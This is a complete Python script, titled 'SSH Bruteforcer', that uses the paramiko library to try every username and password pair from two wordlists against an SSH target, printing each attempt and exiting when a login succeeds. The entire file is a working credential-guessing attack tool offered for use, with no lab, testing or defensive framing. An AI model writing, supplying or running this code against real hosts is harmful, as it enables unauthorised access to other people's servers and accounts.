#!/usr/bin/env python3
# SSH Bruteforcer

import argparse
import paramiko

parser = argparse.ArgumentParser()
parser.add_argument("target")
parser.add_argument("userlist")
parser.add_argument("passlist")
args = parser.parse_args()

with open(args.userlist) as f:
    users = f.read().splitlines()

with open(args.passlist) as f:
    passwords = f.read().splitlines()

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for user in users:
    for password in passwords:
        print(f"Trying {user}:{password}")
        try:
            ssh.connect(args.target, username=user, password=password)
            print(f"Success: {user}:{password}")
            exit(0)
        except paramiko.ssh_exception.AuthenticationException:
            pass

exit(1)